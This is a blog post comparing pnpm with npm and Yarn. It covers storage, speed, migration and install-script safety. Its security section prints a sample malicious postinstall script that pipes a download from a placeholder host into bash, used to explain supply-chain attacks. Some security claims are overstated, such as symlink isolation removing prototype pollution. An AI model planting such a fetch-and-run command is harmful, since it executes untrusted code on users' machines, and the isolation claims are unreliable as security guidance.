---
title: "PNPM – When Devs No Longer Wait for NPM to “Run Errands”"
description: "If install time feels like waiting on someone else’s grocery trip, it’s time to let pnpm take over."
pubDate: "2025-10-29"
published: true
tags: ["pnpm", "npm", "tooling", "package manager"]
slug: "pnpm-when-devs-stop-waiting-for-npm"
author: "Hien Nguyen"
ogTitle: "PNPM – When Devs No Longer Wait for NPM to Run Errands"
ogDescription: "If install time depends on NPM’s grocery run, it’s time for pnpm to handle it."
pairSlug:
  vi: "pnpm-khi-dev-khong-can-cho-npm-di-cho-giup-minh-nua"
---

# PNPM – When Devs No Longer Wait for NPM to “Run Errands”

> “npm install” cranks your fans and nukes your disk? Time to give **pnpm** a spin.

---

## The Familiar Story

You clone a repo and run:

```bash
npm install
```

And then… you wait.  
And wait.  
And keep waiting.

Maybe you try **Yarn**—a bit better—but it still downloads the same package ten times for ten different projects.  
`node_modules` bloats into gigabytes, disks fill up, and CI crawls like a sleepy turtle.

That was the scene before **pnpm** showed up.

---

## How PNPM Differs from NPM and Yarn

In short: **pnpm stores dependencies completely differently.**

| Mechanism       | NPM / Yarn                              | PNPM                                                                      |
| --------------- | --------------------------------------- | ------------------------------------------------------------------------- |
| Storage         | Copies every package per project        | Uses a **global content-addressable store**; projects just **symlink** in |
| Disk Usage      | Heavy, lots of duplication               | Very light; saves tons of space                                           |
| Install Speed   | Average                                  | **2–3× faster** (cache + hard links)                                      |
| Version Control | Managed per project                      | Laser-accurate thanks to **strict symlink resolution**                    |
| Script Security | **Automatically runs `postinstall`**     | **Doesn’t run scripts unless you opt in**                                 |

---

## Security — PNPM’s Underrated Superpower

This is the piece many devs overlook—but it’s huge.

### The Problem with NPM/Yarn

When you run `npm install` or `yarn install`,  
packages can **auto-run scripts** like:

```json
"scripts": {
  "postinstall": "curl malicious-site.com | bash"
}
```

If you’re not auditing closely—or your CI isn’t sandboxed—that code just executed on your machine. Supply-chain attacks like this are everywhere: pull a Node.js repo (maybe for a coding test), run `npm i`, and boom—malware fires, scraping env vars for API keys, GitHub tokens, AWS creds. In September 2025 several popular packages such as `chalk` and `debug` were compromised, cascading into hundreds of dependents; the “Shai-Hulud” worm replicated across millions of installs, leaking secrets simply because install scripts auto-ran. This is a **classic attack vector**, especially dangerous for juniors or teams that don’t audit dependencies.

### PNPM Handles It Smarter

- **No script runs by default**—you have to explicitly allow it.
- You can set `--ignore-scripts` globally in `.npmrc`:
  ```bash
  pnpm install --ignore-scripts
  ```
- Keeps **third-party payloads dormant**—grab a random repo, run `pnpm i`, and malicious scripts stay asleep instead of stealing keys or spreading.
- PNPM also sandboxes `node_modules`, preventing **module A from overriding module B**—attacks such as _prototype pollution_ or _dependency shadowing_ basically disappear.

> Translation: pnpm installs packages without blindly trusting them—exactly what you want after the latest supply-chain incidents.

---

## A Different Design Mindset

### 1. “Global Store” — Smart Disk Usage

PNPM keeps dependencies in a single global store (by default: `~/.pnpm-store`).  
Each package exists **once**—projects just link to it.

```bash
# First project
pnpm install

# Another project later
pnpm install   # Almost instant; packages already cached
```

### 2. “Strict Linking” — No Loose Dependencies

PNPM builds `node_modules` via a custom “virtual store.”  
Dependencies can only reach modules declared in `package.json`.

Benefits:

- No more “hidden dependency” bugs (importing something you never declared).
- Builds are reproducible—CI won’t fail because someone’s laptop leaked globals.

---

## Quick Migration

Already on NPM or Yarn?

```bash
npm install -g pnpm
# Or on Node 18+ with corepack
corepack enable pnpm
```

Switch your scripts:

```bash
pnpm install
pnpm run dev
```

Everything else—scripts, tooling—keeps working.  
You’ll feel the speed boost on the first run.

---

## When Not to Switch (Yet)

- Teams running **Yarn 1 workspaces + heavy custom plugins**—test carefully.
- Legacy CI/CD stacks without pnpm cache support.
- A few tools (rare) still assume classic `node_modules` structure.

That said, with **Node 18+ and corepack**, pnpm is now silky smooth.  
Vercel, Turborepo, Nx, Cloudflare Workers—they all support it out of the box.

---

## TL;DR

|                 | NPM               | Yarn        | PNPM                                   |
| --------------- | ----------------- | ----------- | -------------------------------------- |
| Speed           | Slow              | Faster      | Fastest                                |
| Disk Usage      | Heavy             | Medium      | Very light                             |
| Script Safety   | Auto-runs scripts | Auto-runs   | **Doesn’t run unless you allow it**    |
| Global Cache    | No                | Partial     | Full                                   |
| Isolation       | Low               | Medium      | **High (symlink isolation)**           |
| Best For        | Any small/legacy  | Mid-size    | **Pro teams / modern CI pipelines**    |

---

## Official Resources

- [pnpm.io](https://pnpm.io)
- [PNPM store structure](https://pnpm.io/symlinked-node-modules-structure)
- [Corepack & pnpm setup](https://nodejs.org/api/corepack.html)

---

_Written by a dev whose `node_modules` used to outweigh the source code.  
With pnpm the disk stays slim, builds fly, and CI stays calm._
